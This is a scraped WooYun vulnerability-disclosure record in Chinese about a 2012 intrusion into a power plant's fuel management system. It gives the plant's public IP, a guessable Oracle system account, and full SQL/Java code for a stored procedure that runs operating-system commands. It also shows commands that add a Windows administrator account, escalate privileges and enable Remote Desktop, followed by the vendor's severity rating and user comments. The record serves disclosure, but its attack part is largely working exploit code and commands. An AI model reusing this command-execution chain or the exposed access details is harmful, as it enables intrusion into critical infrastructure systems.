{"id": 20007, "wybug_id": "wooyun-2012-06127", "wybug_title": "东北电网某主力调峰电厂燃料管理系统", "wybug_corp": "中国电力投资集团", "wybug_author": "shine", "wybug_date": "2012-04-16 19:51", "wybug_open_date": "2012-05-31 19:52", "wybug_type": "重要敏感信息泄露", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-04-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-04-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-04-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-05-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-05-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-05-31：\t细节向公众公开  简要描述： 一个Oracle渗透的小例子！ 详细说明：  \n阜新发电厂，国家大型企业,是东北电网主力调峰电厂，其发电企业燃料管理系统多处敏感信息、端口等暴露 遍历暴露数据库用户名及密码信息，不过密码好象都不对，但轻松就被猜解了： http://202.107.80.11\n \n\n \n\n  \n\n\nOracle Enterprise Manager端口暴露，轻松猜解的帐号：fxrmis cpicrmissystemfxrmishttp://202.107.80.11:1158/em/\n\n\n\n\n   漏洞证明：  *乌云编辑框伸缩功能不错（好象有个小bug）！^-^\n然后，利用这组system权限进行exec操作系统帐号添加及提权等命令操作：systemfxrmis\n\n利用sqlplus古老的入侵方式进行java对象创建；函数创建；过程创建\na.sql\ncreate or replace and compilejava souRCe named \"util\"asimport java.io.*;import java.lang.*;public class util extends Object{public static int RunThis(String args){Runtime rt = Runtime.getRuntime();int RC = -1;try{Process p = rt.exec(args);int bufSize = 4096;BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), bufSize);int len;byte buffer[] = new byte[bufSize];// Echo back what the program spit outwhile ((len = bis.read(buffer, 0, bufSize)) != -1)System.out.write(buffer, 0, len);RC = p.waitFor();}catch (Exception e){e.printStackTrace();RC = -1;}finally{return RC;}}}\nb.sql\ncreate or replacefunction RUN_CMz(p_cmd in varchar2) return numberaslanguage javaname 'util.RunThis(java.lang.String) return integer';\nc.sql\ncreate or replace procedure RC(p_cmd in varChar)asx number;beginx := RUN_CMz(p_cmd);end;\n如图：\n\n然后，进行参数设置、授权、帐号添加、提权、远程桌面注册表开启及关闭等命令操作\nvariable x number;set serveroutput on;exec dbms_java.set_output(100000);grant javasyspriv to system;grant javauserpriv to system;exec :x:=run_cmz('net user shine 123456 /add');exec :x:=run_cmz('net localgroup administrators shine /add');exec :x:=run_cmz('REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f');exec :x:=run_cmz('REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f');\n如图：\n\n\n\n\n然后，就是内网，大约有103台左右的主机（只数了一遍）\n如图：\n\n\n\n\n\n   修复方案：  \n以上操作以基本还原到以前的状态，基本无信息修改而造成数据破坏！（CNCERT/CNVD可不可以搞个多少证书后，发个类似带加\"V\"标志的证书，以增加白帽子的积极性！）\n   版权声明：转载请注明来源 shine@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-04-16 20:52 厂商回复： CNVD确认漏洞并复现部分情况（时间关系）。漏洞事件涉事单位级别较高，待请示主管部门领导后再行协调处置。对该漏洞评分如下：CVSS评分：(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N) Score:10.00（最高10分，高危)即：远程攻击、攻击难度低、不需要用户认证，对机密性、完整性、可用性造成完全影响。技术难度系数：1.1(一般，不过Shine同学的脚本用得挺溜，值得学习)影响危害系数：1.8(严重，涉及重要信息系统部门单位业务系统，不过从信息系统应用情况看，应该不是工业以太网区域）综合评分：10.00*1.1*1.8=19.8关于这个漏洞为什么给这么高rank？有以下几个原因：1、从渗透测试角度讲，取得系统主机控制权并且能还原，这也是白帽子精神的技术注解；2、涉事单位为重要信息系统，从内部网络渗透情况看，涉及部分生产环节。wooyun的价值在这一漏洞事件上可以得到充分体现。响应Shine的建议，对于加V的做法，也许一些白帽子还存在顾虑，不过从自律的角度看，我想会越来越多的出现勇于加V的白帽子。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-04-16 19:54 |    \t\t蓝风 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:25        | 崬汸慾哓 嗼檤焄垳皁 沓猵圊屾亾沬荖 颩憬...)\t\t \n  人家不都是用的内网么     \n     2012-04-16 20:43 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  这个集团的副总，李小L...    \n     2012-04-16 21:01 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  @cncert国家互联网应急中心 ...，是前总理及前全国人大常委会委员长的女儿？晕死！没把这个因素考虑进去,要是能给乌云拉点投资来就好了，哥走远也值了！荆柯兄待步...    \n     2012-04-16 21:34 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  神马叫加V...    \n     2012-04-16 21:37 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  实名制么，亲，反正你们有了资料了。我同意加V。    \n     2012-04-16 21:40 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  这事，想起太平洋彼彼岸的案例，一白帽子认为美国国土安全局对某事（http://t.cn/SyUTVc ）表现出“低估对关键设施发动网络攻击的威胁程度”，就渗透得克萨斯州南休斯顿的供水工控系统，并截图公开（http://t.cn/SLdacx ）    \n     2012-04-17 10:14 |    \t\t夜莺 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | C python)\t\t \n  远程攻击、攻击难度低、不需要用户认证，对机密性、完整性、可用性造成完全影响又涉及部分生产环节太恐怖了吧    \n     2012-04-17 10:48 |    \t\t三叶草 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | 幸福是靠自己努力的)\t\t \n  加V啊//你们大牛可以，资料网上都有滴，在哪里上班也有滴，是我等仰望羡慕嫉妒恨的对象啊！//俺还是混出名堂来再加，否则太丢人了//    \n     2012-04-17 15:51 |    \t\tzmx \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:9        | wooyun)\t\t \n  @shine 哥，吓我一跳。。。标题写错了吧。中电投和东北电网不是一家的。。。    \n     2012-04-17 15:56 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  @zmx 没写错了！标题是描述的（那个东北电网不是指厂商，是说的电网系统的地域划分）。^-^    \n     2012-04-17 15:59 |    \t\tzmx \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:9        | wooyun)\t\t \n  @shine 已经电话咨询了cncert，放心了^-^    \n     2012-04-18 08:52 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  今晚也发个某风电系统的问题，来爆爆RANK    \n     2012-04-18 10:23 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  @Z-0ne 鼓励你！注意测试尺度就是，别乱搞。核电站的也会跟上    \n     2012-05-31 20:57 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  这是在乌云见过影响最严重的case，各位大牛小生领教了！    \n     2012-08-13 09:22 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  好好呀 在后面默默学习...    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}